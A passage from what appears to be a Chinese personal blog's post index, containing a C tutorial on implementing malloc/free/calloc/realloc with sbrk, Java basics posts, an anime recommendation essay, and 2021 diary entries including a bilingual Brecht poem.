hb; pthread_mutex_unlock(&amp;global_malloc_lock); return (void *) (hb + 1);}header_block *find_free_block(size_t size) { header_block *curr = head; while (curr) { if (curr-&gt;h.size &gt;= size) { return curr; } curr = curr-&gt;h.next; } return NULL;} 在这段代码中，我们首先获取全局锁。然后，我们调用 find_free_block() 函数来查找一个足够大的空闲块。如果找到了，我们就将这个块标记为非空闲，释放锁，然后返回这个块。如果没有找到，我们就像以前一样使用 sbrk() 函数来分配新的内存。最后，我们更新链表的头部和尾部，释放锁，并返回新分配的内存。 find_free_block() 函数的实现很简单。它遍历链表，查找一个足够大的空闲块。如果找到了，它就返回这个块，否则返回 NULL。 内存释放 在分配内存之后，我们需要释放内存。释放内存的逻辑如下：首先我们将内存块标记为空闲，然后如果这个内存块是链表的最后一个块，我们就释放它。 123456789101112131415161718192021222324252627void free(void *_Nullable ptr) { if (!ptr || ptr == NULL) { return; } pthread_mutex_lock(&amp;global_malloc_lock); header_block *hb = (header_block *) ptr - 1; hb-&gt;h.is_free = 1; if ((char *) ptr + hb-&gt;h.size == sbrk(0)) { if (head == tail) { head = tail = NULL; } else { header_block *tmp = head; while (tmp) { if (tmp-&gt;h.next == tail) { tmp-&gt;h.next = NULL; tail = tmp; } tmp = tmp-&gt;h.next; } tail = tmp; } sbrk(-hb-&gt;h.size - sizeof(header_block)); pthread_mutex_unlock(&amp;global_malloc_lock); return; } pthread_mutex_unlock(&amp;global_malloc_lock);} 在这段代码中，我们首先检查指针是否为空。如果为空，我们就直接返回。然后，我们获取全局锁，并找到这个指针对应的 header_block。我们将这个块标记为空闲，然后检查这个块是否是链表的最后一个块。如果是，我们就释放这个块。最后，我们释放锁。 内存初始化和重新分配 calloc() 函数用于为数组分配内存块，而 realloc() 函数用于改变内存块的大小。如果 ptr 为 NULL 或者 size 为 0，那么它们的行为就等同于 malloc() 和 free()。 1234567891011121314151617181920212223242526272829303132void *calloc(size_t nmemb, size_t size) { if (!nmemb || !size) { return NULL; } int total_size = nmemb * size; if (size != total_size / nmemb) { return NULL; } void *block = malloc(total_size); memset(block, 0, total_size); return block;}void *realloc(void *_Nullable ptr, size_t size) { if (ptr == NULL) { return malloc(size); } if (size == 0) { free(ptr); return NULL; } header_block *hb; hb = (header_block *) ptr - 1; if (hb-&gt;h.size &gt;= size) { return ptr; } void *block = malloc(size); if (block) { memcpy(block, ptr, hb-&gt;h.size); free(ptr); } return block;} 在这段代码中，calloc() 函数首先检查输入参数。如果 nmemb 或 size 为 0，那么它就返回 NULL。然后，它计算总的内存大小，并检查是否发生溢出。如果没有发生溢出，它就使用 malloc() 函数来分配内存，并使用 memset() 函数来初始化内存。 realloc() 函数首先检查输入参数。如果 ptr 为 NULL，那么它就调用 malloc() 函数。如果 size 为 0，那么它就调用 free() 函数并返回 NULL。然后，它检查当前的内存块是否足够大。如果足够大，那么它就直接返回这个块。否则，它就分配一个新的内存块，复制旧的内存块的内容，释放旧的内存块，然后返回新的内存块。 完整代码 以下是我们的完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;typedef char ALIGN[16]; // 对齐16字节union header { struct { size_t size; unsigned is_free; union header *next; } h; ALIGN stub;};typedef union header header_block;header_block *head = NULL, *tail = NULL;pthread_mutex_t global_malloc_lock;header_block *find_free_block(size_t size);void *malloc(size_t size);void free(void *ptr);void *calloc(size_t nmemb, size_t size);void *realloc(void *ptr, size_t size);void print_mem_list();void *malloc(size_t size) { if (size == 0) { return NULL; } header_block *hb; void *block; pthread_mutex_lock(&amp;global_malloc_lock); hb = find_free_block(size); if (hb) { hb-&gt;h.is_free = 0; pthread_mutex_unlock(&amp;global_malloc_lock); return (void *) (hb + 1); } block = sbrk(size + sizeof(header_block)); if (block == (void *) -1) { pthread_mutex_unlock(&amp;global_malloc_lock); return NULL; } hb = block; hb-&gt;h.size = size; hb-&gt;h.is_free = 0; hb-&gt;h.next = NULL; if (!head) { head = hb; } if (tail) { tail-&gt;h.next = hb; } tail = hb; pthread_mutex_unlock(&amp;global_malloc_lock); return (void *) (hb + 1);}header_block *find_free_block(size_t size) { header_block *curr = head; while (curr) { if (curr-&gt;h.is_free &amp;&amp; curr-&gt;h.size &gt;= size) { return curr; } curr = curr-&gt;h.next; } return NULL;}void free(void *ptr) { if (!ptr) { return; } pthread_mutex_lock(&amp;global_malloc_lock); header_block *hb = (header_block *) ptr - 1; hb-&gt;h.is_free = 1; if ((char *) ptr + hb-&gt;h.size == sbrk(0)) { if (head == tail) { head = tail = NULL; } else { header_block *tmp = head; while (tmp) { if (tmp-&gt;h.next == tail) { tmp-&gt;h.next = NULL; tail = tmp; } tmp = tmp-&gt;h.next; } } sbrk(0 - hb-&gt;h.size - sizeof(header_block)); pthread_mutex_unlock(&amp;global_malloc_lock); return; } pthread_mutex_unlock(&amp;global_malloc_lock); print_mem_list();}void *calloc(size_t nmemb, size_t size) { print_mem_list(); if (!nmemb || !size) { return NULL; } size_t total_size = nmemb * size; if (size != total_size / nmemb) { return NULL; } void *block = malloc(total_size); if (!block) { return NULL; } memset(block, 0, total_size); print_mem_list(); return block;}void *realloc(void *ptr, size_t size) { print_mem_list(); if (!ptr || !size) { return malloc(size); } header_block *hb = (header_block *) ptr - 1; if (hb-&gt;h.size &gt;= size) { return ptr; } void *block = malloc(size); if (block) { memcpy(block, ptr, hb-&gt;h.size); free(ptr); } print_mem_list(); return block;}void print_mem_list(){ header_block *curr = head; printf(&quot;\\nhead = %p, tail = %p \\n&quot;, head, tail); while(curr) { printf(&quot;addr = %p, size = %zu, is_free=%u, next=%p\\n&quot;, (void*)curr, curr-&gt;h.size, curr-&gt;h.is_free, (void*)curr-&gt;h.next); curr = curr-&gt;h.next; }} 在这段代码中，我们首先定义了一些全局变量和函数原型。然后，我们实现了 malloc(), free(), calloc(), 和 realloc() 函数。最后，我们提供了一个 print_mem_list() 函数，用于打印当前的内存块列表。","link":"/2024/07/03/how-to-implement-a-memory-allocator/"},{"title":"Java 扫盲（二）集合","text":"介绍 Java 集合相关，如何设计，为什么这样设计？主要从存储和速度两个方面考虑。 Java 1.2 版本后通过 java.util.Collection 和 java.util.Map 解决了两个问题：统一管理容器对象，而不用像以前那样各种 API 满天飞，最直观的感受是程序员在算法中用起来很顺手；容易拓展，我们可以很方便地构建一个类似的自定义数据结构。 观察上图，其实可以得出很多观点，比如： List、Queue 和 Set 都实现了 Iterable 接口，这表示它们都可以遍历，事实上 Set 甚至可以排序（SortedSet）。 LinkedList 模糊了 List 和 Queue 的界限。 ArrayList ArrayList 就是一个动态数组，那我们都知道数组本身是一个固定不变的数据结构，其 “动态” 是如何体现的呢？很简单，直接创建一个新的更大的数据结构去装更多的元素，这个更替过程我们通常称之为 “扩容”，实际上是一个很简单也很直接的概念。 当然，虽然支持动态扩容方法很简单，但这样做我们很快就会遇到以下问题： 什么时候扩容？装不下了就扩容，之所以这里提一嘴，是因为 HashMap 扩容是由负载因子决定的，负载因子就是可容纳元素上限除以哈希表长度。 如何扩容？1.5 倍扩容，当然这个值本身可以自定义，通常我们会让其 2 倍扩容，将初始容量设置成一个 2 进制的数而不是原来的 10（10 的初始值主要方便了 1.5 倍扩容）。 如何保证数据安全？比如一边在扩容数组，另一边在删除某元素，这里就涉及到 fail-fast 机制。 fail-fast 机制 TODO HashMap TODO","link":"/2023/04/07/java-basic-intro-collection/"},{"title":"Java 扫盲（一）基础中的基础","text":"根据 TIOBE，Java 直到 2023 年依然是主流编程语言。在 Java 8 以前掌握这门语言是一件比较简单的事情，但在 8 之后学习曲线开始变陡，即使经过多次减负学习成本也在慢慢增加，尤其需要耗费在学习各种框架的原理和应用之上。_Java 扫盲系列_不会像官方 Doc 一样事无巨细地对语法絮絮叨叨不停，而是会按我个人喜好将其拆解分析，着重于方法论上。 在学习一门编程语言之前，按照惯例，附上三篇大牛漫谈雄文，分别是 Paul Graham、Bruce Eckel 和 Peter Norvig。 ⭐IT 大牛谈编程语言（网文 3 篇）译自 阮晓寰 Object 通用方法 在 Java 中，Object 类是所有类的祖先，因此我们应该先去见见这个 “老祖宗”，看看它所定义的常用方法。 getClass 返回该对象运行时类的信息，我们常用这个方法获取对象的类名 toString 默认返回类似 “对象名 @14114e1c” 这种形式，后面跟着的是_散列码的 16 进制表示_ hashCode hash 中文译作 “散列”，本身代表一种基本的计算机概念，每个 hash 都代表一种哈希生成算法，而 Java 中的 hashCode 会返回一个和内存地址相关的 32 位整数，从而利用对象唯一性来保证其哈希码的唯一性。 equals 原始的 equals 方法只是让两个对象用 == 直接比较，因此 String 类有重写该方法，当我们设计类的时候想要正确比较同样也需要重写这个方法。如 1234567891011@Overridepublic boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; EqualExample that = (EqualExample) o; if (x != that.x) return false; if (y != that.y) return false; return z == that.z;} clone 拷贝又分为浅拷贝和深拷贝，浅拷贝就是返回同一个引用对象，而深拷贝就是返回和原始对象的引用类型但引用的是不同对象，前者基本没啥意义，我们谈拷贝默认指深拷贝。在 Java 中，如果一个对象没有实现 Cloneable 接口，默认抛出 CloneNotSupportedException，另外 clone 方法是复制一个数组最快的方法。 为什么我们需要克隆方法而不是直接用 new 创建一个新对象？因为用 new 创建对象会耗费大量时间。 如何在实际应用中使用 clone？如果是已经设计部署好的类，我们可以定义一个父类并实现 Cloneable 接口。 下面，用一个实际例子说明如何正确使用 clone 方法： 1234567891011121314151617181920212223242526272829303132public class demo { public static void main(String[] args) throws CloneNotSupportedException { B b = new B(&quot;X ming&quot;, 12); System.out.println(b); B c = (B)b.clone(); System.out.println(c); }}class A implements Cloneable{}class B extends A{ String name; int age; B (String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return super.toString() + &quot;, &quot; + name + &quot;, &quot; + age; } @Override protected Object clone() throws CloneNotSupportedException { return super.clone(); }} wait, notify 和 notifyAll 线程类指那些继承自 Thread 的类，唤醒指让线程状态从阻塞态转为就绪态。 wait, notify 和 notifyAll 方法是 Java 留给线程通信的，本质是修改锁对象状态。比如其中的 notify 就是用来唤醒单个线程的。 123456789synchronized( lockObject ){ while( ! condition ) { lockObject.wait(); } //take the action here;} String Java 中的 String 底层是 char 数组，但是实现了 CharSequence 接口的类还有 StringBuffer 和 StringBuilder。我们会用 StringBuilder 创建_可变字符串_，为什么专门提出这个概念，字符串不都是可以修改吗？并不是，Java 中的 String 是 final 修饰的，当我们尝试修改它时，本质上是用一个新创建的实例去替换它。 String 对象有两种创建方式，一种是字面量创建的方式，如 12String s1=&quot;Welcome&quot;; String s2=&quot;Welcome&quot;;//It doesn't create a new instance 用这种方式创建的字符串会直接再字符串常量池里面创建，大大节省内存效率。而另外一种创建方式就是 new 关键字了，略过不表。 反射 通过反射，我们可以知道一个对象的类是什么，它能够执行哪些方法。换句话说，我们可以在运行时通过反射调用 private 方法甚至构造一个对象。 我们的调试和测试工具就有用到反射，常用的框架比如 JDBC、Spring、SpringBoot 等都用到了反射，将数据库参数这种都写在配置文件中而不是代码里，让程序运行的时候自动去取。 总的来说，反射是帮助 Java 实现自动化必不可少的一个帮手。 异常 Java 用异常捕获来处理运行时发生的错误，比如 ClassNotFoundException, IOException, SQLException, RemoteException 等等。一般来说，异常的名称就告知程序员问题所在，而详细信息则描述了上下文信息。 异常又可以细分为 Checked Exceptions 和 Unchecked Exceptions，前者是可以恢复的。 我们可以利用 Java 的异常机制来检测失败和成功而不是笼统返回 true 或者 false。 参考 【 1 】Java 新手的通病系列 【 2 】On Java 8","link":"/2023/04/05/java-basic-intro/"},{"title":"一些动漫推荐","text":"这篇文章是我在大一写的，主要目的是给想了解日漫的朋友们推荐一些水平优秀的动漫，顺带也为我的动漫史划上句号，年龄过了，动漫给的已不是我所想的了。 史前长番如《乱马 1/2》，《圣斗士星矢》，《幽游白书》，《犬夜叉》等我就直接略过了，这些动画尽管是当年的经典，但是由于年代 “久远”，很多梗都被玩烂了，拖沓的节奏和俗套的剧情大概只有等到剧荒前去 “考古” 时才能被忍受吧。 我们先从众所周知的日本三大民工漫 ——《死神 BLEACH》、《One Piece》、《火影忍者》聊起。与同为长番靠循环式的打怪升级来推动剧情的《龙珠》不同，而是凭借一集接一集的紧凑剧情来拉拢受众。不过尽管都很优秀，这三人在剧情方面的差距也是不小的，久保带人动笔前肯定完全未料到自己作品的大热，所以蓝染篇后自己乱加的剧情混乱又拖沓简直看的人一脸尴尬，我看完后直接粉转路人。相比之下，岸本齐史的叙事能力则要强不少，前面挖的坑后期也基本都埋了（此处应手动 @三叔），不过晓组织被灭掉后，亮点就不多了，后面忍者大战集体开挂也是看的我一脸懵逼，幸好结尾还算跌宕起伏，不过由于看之前各种分析贴剧透贴的轰炸导致我在看番的时候只能默默吃瓜，完全体验不到任何惊喜；而尾田荣一郎显然有着颇大的野心，一开始的确是老老实实以少年番风格拉票，中期笔锋一转，不仅画风越来越养眼，剧情也不再浅显无脑，人物对白也越来越有深度。最为重要的是，尾田已经不满足于用剧情来吸引读者，路飞能否当上海贼王已不再是故事的核心，追随路飞一次次地探索和冒险才是 One Piece 新的主题。 不过话又说回来，毕竟是民工漫，长篇累牍总会让人觉得啰嗦，快进键远比音量键按得频繁。况且，90 年代的东西再怎么精妙也不免让人觉得老套。相比之下，《EVA》仅用 27 集在打败同期的《LAIN》（也是一部神作，不过就是太生涩了点，也许会有人说 EVA 不难看懂，但相信没人敢说自己能一周目看懂《LAIN》这种蒸汽朋克带意识流的作品）后便彻底奠定了自己漫坛史上老大的地位，相信再过 50 年，三无女、碇真嗣这些名字还会有人提起，而那单帧定格的 64 秒依然会让人津津乐道，不过他们要是知道那经典的 64 秒其实是让迫在眉睫的经费给逼出来的会是怎样一副喜感的表情。而一说到《EVA》就不得不提《Cowboy Bebop》和《攻壳机动队》（三部作品被共称为动漫界的科幻三部曲），音乐、剧情、画面、节奏感都是顶级的，前者是 sunrise 公司斥巨资打造的明星产品，而后者是由拖稿大王士郎正宗（攻壳前后拖了 20 年）和动画怪才押守井合作完成。与这三者相比，即使是天才画家荒木飞吕彦以想象力和凛冽画风著称的《JOJO 奇妙冒险》也略显黯淡。除了科幻三部曲，还有记忆三部曲，不过后者是一部由三个短片组成的电影，这部电影由曾创作过《Akira》的大友克洋执导，编剧是今敏，没错，就是那个拍出《千年女优》（动画蒙太奇镜头如教科书般精准）和《未麻的部屋》的家伙。不过，由于今天只聊番剧，动画电影就略过了。 从上面容易看到，大多数有深度的动画都是走科幻路线，作为同名游戏改编的《命运石之门》、《魔法少女小圆》和《空之境界》也是如此，无论是爱吐槽的凤凰院凶真还是萌萌的小圆或者高冷的两仪式在其表象之下都有一整套严密的世界体系和比较科学的逻辑性和较正的三观。与之相反，像《刀剑神域》这种日式无脑三少流（自动脑补《斗破苍穹》这类）虽然大火但自然是不为我们 OTAKU 所推荐的了。 从 06 年开始，日本动漫掀起一股物语潮，目测是由于一部霸权动画（指长期占据热销榜首，并聚集了大量人气的番剧）《化物语》引起的。这种用对话推动剧情甚至以剧情为壳人物对白为核的番剧逐渐大肆占领各大动画市场，像《凉宫春日的忧郁 &amp; 消失》、《吹响！上低音号》等则是其中代表作品（团长春日是我女神我会口胡？！）。与此同时，女性向作品也越来越多，不过类似《十二国记》这种以剧情取胜的作品已经不会再出现了，更多应该是《黑执事》这种卖腐的或者《CLANNAD》这种赚泪的，以及《夏目友人帐》这种，虽然表面是在一本正经的讨论妖怪与人的关系，不过妖怪画这么萌男主这么暖，骨子里肯定还是女性向作品。 至此，科幻（尤指硬科幻）向番剧应该会越来越少，即使偶有优秀作品如《来自新世界》，明明是科幻番，却依然会带着浓浓物语色彩（不过也正是因此才能脱颖而出吧），不过看完能引人思考（当然我由于早已看过《时间机器》了就很淡定了）。《夏娃的时间》最近又突然火了起来，然而还是披着科幻外衣的物语系作品。至于其他，连《罪恶王冠》这种砸下巨金的大作都不温不火，可想而知其他番的下场。 不过，《进击的巨人》的出现却让我看到一丝曙光，以血腥的画面、酣畅的打斗以及紧凑到不行的剧情（剧情异常严密，我看了两遍动画，暗示细节做得很好）成功吸引一大波小白，然后是资深评测纷纷投赞成票，最后自然是成为年度霸权。其作者谏山创是在剧情完成度极高的情况下才开始作画的，所以包袱丢的恰到好处，挖坑也不是一时心血来潮，人物的简单对白里也暗藏无数惊人秘密。尤其，这是一部科幻系作品，并非口胡。嗯，巨人就说到这里，有空的话我会专门写一篇关于巨人的（事实上我并不想写）。 啊，既然提到了巨人，就不得不提另外两大美食番 ——《东京喰种》、《寄生兽》。与巨人相反，《喰种》的动画化成功让一大波人路转黑，而原著读者也因为其后期完全靠打斗来推动剧情而深表失望，再神的 op 也挽救不了喰种狂衰的热度。而《寄生兽》作为一部 03 年的老番被人再次提出来并与时下热门作对比即可见其质量不低，至少比啃种高不少。同样黑暗系作品，《寄生兽》通过对寄生兽的视角描写来揭开人性的卑劣以及矛盾，并对世界卫生的保护提出深深的担忧。而啃种，只是在一直啃罢了。 黑暗系最出彩的应该是《死亡笔记》了，观众一直以夜神月为主视角，被编剧巧妙的手法和夜神月的坚决的话语所欺骗，带着主角即正义的这种观点一步步看下去，直到最后蓦然警醒：原来正义才是胜利（笑）。而以大长腿细蛮腰闻名的《叛逆的勒鲁什》主角和夜神月性格类似，但他最后被定义为正义的关键在于底线，夜神月为了自己可以抛弃自己亲人、爱人和朋友而勒鲁什却会反过来牺牲自己（ps：结局表面 2End 实际是 Bad End）。 时间貌似已经很晚了，直接列表算了，没错，我就是这么懒。 萌向《干物妹，小埋！》适合可乐配薯片宅在家里看，而装逼成瘾的《一拳超人》和《在下坂本，有何贵干！》则属于那种一口气补完的类型（也就是补番好过瘾，补完没鸟用）。《灵能百分百》画面太丑，弃。《黑礁》原来玩枪可以这么酷系列，《死亡代理人》人、机、未来系列，《Psycho-Pass》看了可以吹一年系列，《鸦 KARAS》就冲它把龙太子公司都拍倒闭了还是可以看看的…… 以上。","link":"/2017/03/15/life-comic-recommend/"},{"title":"2021 年 10 月","text":"人要获得乐趣。 听歌，看电影，吃美食，完美的精神按摩，浸入灵魂的酥麻感包裹着我。 在描述生活的时候，尽量少捎带自己的观点和思想，这会抢走生活细节的风头。虽然我写下那些话的本意就是表达那些观点和思想，但这很呆板，如果不能完整表述输入的画面、声音、味道，而只是带着 “偏见” 去浅薄描述那些东西，肯定是不好的，至少是不够好。 马斯洛定义爱和被爱为人类的基本需求，爱猫算不上是一种善的品质，当然也与恶无关。马斯洛需求包括生理需求、安全需求、爱和归属需求、自我实现需求、超自我实现需求，如何能进入心流呢。 计算机专业知识的学习，从最基础的编程语言到框架、快捷指令、recipes 等，都应该从一本好书出发，围绕官网给的教程一步步学习。之前学习时常常被浩如烟海的书籍和网络知识给淹没，或陷入猴子掰玉米的窘境，每次都浅尝辄止，学的不到位也学不深，完全是在浪费时间。 是否应该把有钱人关进去呢。 技术博客的搭建已经刻不容缓了，我需要今天完成它。 啊，咖啡，久违的爱，真想扎进咖啡池里，忘掉现实中的一切。小脑开始麻痹，身体开始发热，手脚有轻微的颤抖感，口腔很干涩，我能感受到舌苔上的苦。我挺直了腰，端坐在电脑前发呆，听着古早味的歌，开始了新的一天。 身体是无意识的大脑，我们需要给身体预热。 来自江苏的同学居然不太会说吴语，我很惊讶，不过我学会了一个新词 “港伯宁”（江北人），果然学坏话要比日常用语快很多啊。 要允许自己创造垃圾。 今天见了导师，得知我是第三届，简单谈了谈心。研一阶段暂时由我自己安排，我的基础比较差，知识体系非常零碎，需要学好国外公开课。 晚上和一位网友在二次元群聊天，他家里很有钱但小时候比不过亲戚富，如此童年有很多契合之处让我很有共鸣。作为时代红利的享受者，他虽然家境越来越优渥，但依然对社会诸多弊病抱有怨言。","link":"/2021/12/02/life-diary-21-10/"},{"title":"2021 年 11 月","text":"人生有涯而知无涯，以有涯逐无涯，殆已。我知道自己本事不小，但也没那么大，勤勤恳恳做足每天功夫，争取活一日消一日业即可。 写完政治论文，才发现自己在社哲方面的理论知识苍白如稚童，然而平常依仗的 “经验” 基本都来自快餐文章或者别人长篇大论后所剩的残羹冷炙，这实在很不明智。之前决定放弃键政的理由是无用，一来历史循环往复非我一人之力所能撼动，“针砭时弊” 不如洞察规则从中获利，我想聪明人都是如此做的；二来键政时那些振聋发聩的 “真理”，我很难用解释清楚。如今才发现自己错的很大，如果我想要获得真正有用的东西，还是需要低下头从那些厚部头里受教一番才行。针砭时弊是假，意气用事是真，去人为循天道才是正途。而那些如获至宝的真理也不见得那么真，难以解释清楚的原因也在于我并未真正理解政治或者说人心。当然很多时候，于众人面前说一句 “漂亮话” 可能受者众多，但也仅此而已，夜里的辗转反侧只是自我折磨罢了。 重走人生路，我觉得童年少年青年时期需要经历同样的事情三次，不多也不会少，看一部电影三次，看一本书三次，常览常新。这里的新是既是指尘封已久的新鲜感，也有新悟出的道理。 我曾日复一日担忧自己这一生毫无意义，重点不是我个人，而是每个人。如今我坦然接受了这一事实，开始容忍自己的平凡和普通。普通而无意义的人生也没什么不好的，我并非抱怨我个人在某种价值观上的渺小，而是单纯觉得大空虚也是好的，能接受的。我现在有肉身、会说话、能思考，倘若我死了，死去的我同活着的我也无本质上的不同。我已然理解并接受这种色即是空的概念，但是我很难精确地去描述出来。我喜欢美的东西，音乐、画、书法、电影，甚至是整齐的代码、优雅的布局等一切能表现艺术的东西。艺术不单单是数学意义上的几何美，几何美无非是循环、对称和黄金比例，或者是简洁优美的表达式。美就是美，一种状态，一种氛围，一种情感，它既是独立于世的，又是交互的，美又分为人为的和自然之美。 我们每个人都是沙滩上的海豹，在生活泥沼里的挣扎沉浮固然辛酸，但在超我视角里，跟海豹懒洋洋地翻个身子其实差别不大。我存活着，我正思考着，我即世界，世界即我。当然，这里的世界指的是我独有的精神世界，它借我的眼睛传递虚妄，也借我的口鼻传递欲望，它的意义却是由我赋予，但这一范畴下意义存在与否本身已是毫无意义。","link":"/2021/12/02/life-diary-21-11/"},{"title":"2021 年 4 月","text":"考研结束，上岸 FDU。未来的目标很明确，拼尽全力。 老实说，备考并不辛苦，但患得患失时也会失眠一整夜。 想弄个草缸养几条斗鱼，想看浦泽直树的《MONSTER》，想听一下午 Killer Queen，想看天上游来游去的云和热气腾腾的红油火锅。 人就是一层又一层的壳子。 爱我的老爸老妈！","link":"/2021/04/07/life-diary-21-4/"},{"title":"2021 年 9 月","text":"《月季年》记录了我的一些随笔，主要是生活中的一些困惑、感悟和教训，方便日后的我借鉴思考。我这人时而清醒、时而浑噩，这跟白天黑夜无关，毕竟人不是机器总会懈怠爱偷懒，我尤其爱偷懒。所以，我希望靠清醒时的我能做我最无保留的恩师，记录下文字，好教诲那个不知进步的我。 “个人颓废是由于一元价值观导致的吗？” 至少对于我来说不是的。我的懒，小时候是厌恶作业，长大后是虚无主义作祟。现在是迷茫，人生长河行舟至半却突然分不清向前还是向后，只好踌躇在河中央，懒着。当然，这还算不得真话，大三体测一公里快到终点了，不也停下来大口喘着气，拖着脚跟慢慢走，这是实打实的能力跟不上。一元价值观就是大家都追求一个东西，赛道又窄，一旦输太多就放弃了。天天买彩票偶尔还能刮出二两面钱，读书当官发大财可没那么大随机性，至少没随机到 “动动手指对对数字” 那种地步，总之是很多人连彩票钱都不愿意出了，不乐意在那里打水漂。当然我不是，前面也说了原因。 “虽然很不想承认，但我的确缺乏幽默感，单纯只是个无趣的人，NPC。” 纯粹的抱怨，谁不想有幽默感呢，自嘲也好、解构也好，能换来旁人喝彩总归是好事。反正我成年后就没怎么被肯定过，其实成年前也没怎么被夸，不过那会儿年龄小好歹能有点鱼跃龙门的念想。 “工人读史真的不错，一遍又一遍，时刻提醒着我。” 工人读史 A Worker Reads History 【德】贝尔托・布莱希特 Bertolt Brecht 忒拜七门谁人铸造？Who built the seven gates of Thebes? 帝王名号满载史册。The books are filled with names of kings. 其中几人亲运石料？Was it the kings who hauled the craggy blocks of stone? 巴比伦古城屡屡破败，And Babylon, so many times destroyed. 谁人不厌兴土重建？Who built the city up each time? 利马圣殿金碧辉煌，In which of Lima’s houses, That city glittering with gold, 筑者入住几许？lived those who built it? 中国长城修毕之日，In the evening when the Chinese wall was finished 石匠又去向何方？Where did the masons go? 罗马帝国扬威耀武，Imperial Rome is full of arcs of triumph. 又是何人之功？Who reared them up? 凯撒凯旋，谁者败寇？Over whom did the Caesars triumph? 拜占庭歌舞升平，Byzantium lives in song. 几家欢喜几家忧愁？Were all her dwellings palaces? 梦城亚特兰蒂斯，And even in Atlantis of the legend 沉没之夜，将死之人，The night the seas rushed in, the drowning men 仍对苦役恶语相向。still bellowed for their slaves. 亚历山大征服印度，Young Alexander conquered India. 仅凭一人之师？He alone? 凯撒攻下高卢，Caesar beat the Gauls. 岂无厨师随行？Was there not even a cook in his army? 腓力二世海战灰飞烟灭，Phillip of Spain wept as his fleet was sunk and destroyed. 几人泪眼相望？Were there no other tears? 腓特烈大帝七年胜战，Frederick the Greek triumphed in the Seven Years War. 麾下将士几何？Who triumphed with him? 凯歌数不尽，Each page a victory 庆功者何人？At whose expense the victory ball? 十年一豪杰，Every ten years a great man, 谁人独风骚？Who paid the piper? 太多的史例，So many particulars. 太多的问题。So many questions. “旦夕真的不够好用，很想自己做一款更好的。” “浴室里的喷头调整到与龙头夹角 10 度左右温度刚刚好。” “9 月 22 日，依然不知道应该表现出一个什么样的姿态，暂时是孜孜求学的努力上进好青年。” “人的善恶观就像神经网络跑过的一样，刚出生时好坏不分，每个人的训练集不同。” “好的东西值得拥有一个名字。” “为什么电影里面，小孩子总是象征着希望呢，时间能让不可能成为可能吗，可是我总觉得很多东西早已命中注定。” 每个人都应该拥有自己的价值观。 “为什么当狗的会惋惜别人当鸡的呢。” “当我迷茫痛苦的时候，会整理好自己的欲望，一点点列出来，去掉遥不可及和触手可得的选项，排号计划，努力达成。” “漫画的下载可以到对应的字幕组，加群或者社区讨论组，很多漫改动画对应的原版漫画有点年代久远了。” “想写一本关于勇气的小说，希望能鼓励我一往无前。” “我所以为的并不一定真实，耳听为虚。” “上次英语老师说到 kant 的定言令式以及利己主义，我觉得这种东西要看大环境的，大环境好，我肯定愿意当好人，大环境不好，我也不喜欢被人拿枪顶着，毕竟我也不是棒槌转世。” “自信自信，一定要自信，面带微笑，享受这属于自己的人生。” 这是这个月我学会的最宝贵的东西，保持自信能够解决生活中绝大多数鸡毛蒜皮的小问题，赶走那些杂乱无章的思绪。首先，深呼吸，微笑，默念 “我也太牛逼了。” 足够夸张，但足够有效。另外不要学会尴尬这种工具人情绪，尤其在察言观色这一技能的产出率极为低效的情况下，这是下等人学来自保的，你不尴尬，尴尬的就是别人，当你足够优秀时，这种不解风情甚至也能成为一种奇妙的特点。所以想做什么就做什么，不要顾忌，想学习就学习，想锻炼就锻炼。 沿着天桥爬上去有一条白色过道，没有红绿灯，全凭胆子，我选择从桥下绕过。单行道旁的老屋有一排粉色洗浴房，不知道颜色几成。门口的告示牌上写着，上海中学会针对外籍学生收取额外费用，省籍或者国籍并不明确。 市光路直楞楞走四五个路口倒右拐，插进国和路，算是真正从郊区转进闹市，吃喝玩乐的东西多起来，市井气息渐浓，路过一小区 “XX 二村”，我猜是倒迁房，农民伯伯天降横财羡煞了我。 上海的风一阵一阵吹，两侧茂密的行道树也跟着舞，落叶婆娑。我觉得上海和成都很像，虽然我听不懂吴语，但还是莫名亲切。其实细下说来倒也不算莫名，无非是普通话总是客套过头平添了生分，所谓敌人的敌人是朋友，总之四川话和吴语在那一刻暂时握手言和。 我也不怎么思乡，我对成都也好，宜宾也好，都不怎么怀念，倒不是我冷血，抬头望天，都是一样的月亮缀着三两颗星星，独在异乡为异客的愁苦多半是因为生活受困水土不服，我吃的好睡得香肯定没法共情，而且电话微信让我觉得这世界真小，也许我要到了月球、火星才会对着信号发射器黯然神伤生着光速不可变的闷气吧。 我要记录上海吃过的一些菜，那些好吃的推荐，那些不好吃的帮别人踩雷，再四处考察考察一下 “营商环境”。说到这个，我发现上海这边的餐饮都基本是进门入座然后扫码点餐，成都远没有这么普及。今天吃兰州拉面，门里门外十来个服务员，尤其门口站着四五个小哥，有点浪费人力了，而且我不喜欢服务员堆在门外迎客，我喜欢低调些。好在一进门就没什么人搭理我了，肉夹馍特别好吃，比硬邦邦的三细面高到不知道哪里去了。吃了面，喝了点汤，出门捏着肉夹馍边走边啃，啃完一半走远了又开始后悔没多顺手拿一张纸巾。 另外，垃圾桶真的少，我手里的包装纸走了三四个路口也没遇到垃圾桶，值得一提的是商场旁边有三个放垃圾桶的位置，我当时满脑子真香谁会知道自己会变成猴子掰苞谷的倒霉蛋呢。 走到马路边上有一家三口在闲聊，又是房子，说什么摇到就是赚到，39 平的小户型什么的，路上又被一身廉价西装的售楼小哥硬塞了一张广告，50 平 150 万，懒得看了。总之，上海只要不买房还是挺舒服的，我比较中意的房子基本都是 10W + 起步。吓死人，我还不如回老家买套大平层，就算是有皇位要传也犯不着花那么多钱买这玩意儿啊。再说，我装修至少 50 万打底的，谁乐意花一堆钱买个光秃秃的火柴盒然后简单装修一下 “凑合” 过着呢，人，只能活一辈子。 上海的雨啊，呼呼的来，呼呼的走，浪费我五十大洋，算是给嘴馋这毛病埋单的。","link":"/2021/10/06/life-diary-21-9/"},{"title":"2022 年 1 